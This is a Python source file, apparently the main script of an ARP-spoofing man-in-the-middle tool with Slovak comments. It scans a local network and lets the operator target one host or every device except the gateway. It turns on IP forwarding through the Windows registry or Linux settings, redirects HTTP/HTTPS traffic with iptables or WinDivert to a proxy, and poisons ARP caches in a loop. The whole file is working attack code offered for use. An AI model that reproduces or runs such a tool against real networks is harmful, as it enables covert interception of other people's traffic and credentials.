# main.py
import argparse
import sys
import time
import signal
from utils import detect_os, print_devices_table
from scanner import scan_network
from mitm_linux import enable_ip_forward, setup_iptables, clear_iptables, spoof, restore
from mitm_windows import WindowsMITM
import scapy.all as scapy

# Globálne pre restore
spoofed_pairs = []  # [(target_ip, gateway_ip, target_mac, gateway_mac), ...]
current_mitm = None

def graceful_exit(signum, frame):
    print("\n[!] Ctrl+C — obnovujem sieť...")
    cleanup()
    sys.exit(0)

def cleanup():
    global spoofed_pairs, current_mitm
    os_type = detect_os()
    
    if current_mitm and os_type.startswith("windows"):
        current_mitm.stop()
        # ARP restore už ide cez scapy aj vo Windows
    elif os_type == "linux":
        clear_iptables()
    
    # Vždy obnov ARP tabuľky cez scapy
    for target_ip, gateway_ip, target_mac, gateway_mac in spoofed_pairs:
        if target_mac and gateway_mac:
            restore(target_ip, gateway_ip, target_mac, gateway_mac)
            restore(gateway_ip, target_ip, gateway_mac, target_mac)
    print("[*] Sieť obnovená.")

def main():
    signal.signal(signal.SIGINT, graceful_exit)
    
    parser = argparse.ArgumentParser(description="🛡️ Univerzálny ARP-MITM nástroj (Win11/Linux)")
    parser.add_argument("-n", "--network", default="192.168.1.0/24", help="Sieť na sken (napr. 192.168.0.0/24)")
    parser.add_argument("-g", "--gateway", help="IP brány (ak nezadané, pokúsime sa zistiť)")
    parser.add_argument("-r", "--redirect", default="127.0.0.1", help="IP, kam smerovať HTTP/HTTPS (default: 127.0.0.1)")
    parser.add_argument("-p", "--ports", nargs=2, type=int, default=[8080, 8443],
                        help="Porty pre HTTP a HTTPS proxy (default: 8080 8443)")
    parser.add_argument("--no-scan", action="store_true", help="Preskočiť sken, rovno spustiť")
    
    args = parser.parse_args()
    os_type = detect_os()
    print(f"[i] Detekovaný OS: {os_type.upper()}")

    # 1. Skenujeme sieť
    devices = []
    if not args.no_scan:
        devices = scan_network(args.network)
        print_devices_table(devices)
    else:
        print("[*] Preskakujem sken...")

    # 2. Zisti bránu (ak nie je zadaná)
    gateway_ip = args.gateway
    if not gateway_ip:
        try:
            gateway_ip = scapy.conf.route.route("0.0.0.0")[2]
            print(f"[i] Automaticky detekovaná brána: {gateway_ip}")
        except:
            gateway_ip = input("[?] Zadaj IP brány (gateway): ").strip()
    
    gateway_mac = scapy.getmacbyip(gateway_ip)
    if not gateway_mac:
        print(f"[!] Nepodarilo sa získať MAC brány {gateway_ip}")
        sys.exit(1)

    # 3. Výber cieľa
    target_ip = None
    if not args.no_scan and devices:
        print("Vyber možnosť:")
        print("  a) Spoofovať VŠETKY zariadenia (okrem brány)")
        print("  *) Zadaj konkrétnu IP z tabuľky")
        choice = input("→ ").strip()
        
        if choice.lower() == "a":
            targets = [(d["ip"], d["mac"]) for d in devices if d["ip"] != gateway_ip]
            print(f"[+] Vybrané všetky ({len(targets)} zariadení)")
        else:
            target_ip = choice
            target_mac = None
            for d in devices:
                if d["ip"] == target_ip:
                    target_mac = d["mac"]
                    break
            if not target_mac:
                target_mac = scapy.getmacbyip(target_ip)
            if not target_mac:
                print(f"[!] MAC pre {target_ip} nenájdená")
                sys.exit(1)
            targets = [(target_ip, target_mac)]
    else:
        target_ip = input("[?] Zadaj cieľovú IP: ").strip()
        target_mac = scapy.getmacbyip(target_ip)
        if not target_mac:
            print(f"[!] MAC pre {target_ip} sa nepodarilo získať")
            sys.exit(1)
        targets = [(target_ip, target_mac)]

    # Ulož pre restore
    global spoofed_pairs
    for ip, mac in targets:
        spoofed_pairs.append((ip, gateway_ip, mac, gateway_mac))

    # 4. Štart MITM podľa OS
    print(f"[*] Spúšťam MITM smerom na {args.redirect}:{args.ports[0]}/{args.ports[1]}")
    
    if os_type.startswith("windows"):
        if not scapy.conf.use_pcap:
            print("[!] Npcap nie je nainštalovaný — nainštaluj ho: https://npcap.com")
            sys.exit(1)
        # Zapni IP forwarding (registry)
        import winreg
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                                0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "IpEnableRouter", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
            print("[i] IP forwarding povolený (vyžaduje reboot na trvalé nastavenie)")
        except PermissionError:
            print("[!] Spusti ako ADMINISTRÁTOR pre povolenie IP forwarding!")
            sys.exit(1)
        
        global current_mitm
        current_mitm = WindowsMITM(
            redirect_ip=args.redirect,
            redirect_ports=args.ports
        )
        current_mitm.start(targets, gateway_ip)
        print("[✅] MITM beží (Windows + WinDivert). Ctrl+C pre ukončenie.")

    elif os_type == "linux":
        enable_ip_forward()
        setup_iptables(f"{args.redirect}")
        attacker_mac = scapy.get_if_hwaddr(scapy.conf.iface)
        
        def spoof_loop():
            while True:
                for target_ip, target_mac in targets:
                    spoof(target_ip, gateway_ip, attacker_mac, target_mac)
                    spoof(gateway_ip, target_ip, attacker_mac, gateway_mac)
                time.sleep(2)
        
        import threading
        thread = threading.Thread(target=spoof_loop, daemon=True)
        thread.start()
        print("[✅] MITM beží (Linux + iptables). Ctrl+C pre ukončenie.")
    
    else:
        print(f"[!] Nepodporovaný OS: {os_type}")
        sys.exit(1)

    # Čakaj kým user stlačí Ctrl+C
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        graceful_exit(None, None)

if __name__ == "__main__":
    main()
